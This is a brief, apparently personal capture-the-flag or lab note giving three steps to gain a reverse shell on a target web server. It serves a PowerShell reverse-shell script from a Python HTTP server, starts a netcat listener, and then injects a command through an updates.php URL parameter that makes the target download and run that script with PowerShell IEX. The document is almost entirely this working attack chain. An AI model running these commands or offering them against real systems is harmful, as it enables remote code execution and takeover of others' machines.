## haha yes shitty wordpress site go brrrrrrrrrrrrrrrrrrrrrrrrrr

### 1: host http server for target to get exploit ps1 (might need to change host in ps1 file).
```
sudo python3 -m http.server 80
```
### 2. create ncat listener for shell
```
sudo rlwrap nc -nvlp 443
```
### 3. go to the updates url we went to with the sqli injection and start that script (update ip if needed)
```
http://10.10.10.167/updates.php?c=powershell%20IEX(IWR%20http://10.10.14.39/Invoke-PowerShellTcp.ps1%20-UseBasicParsing)
```
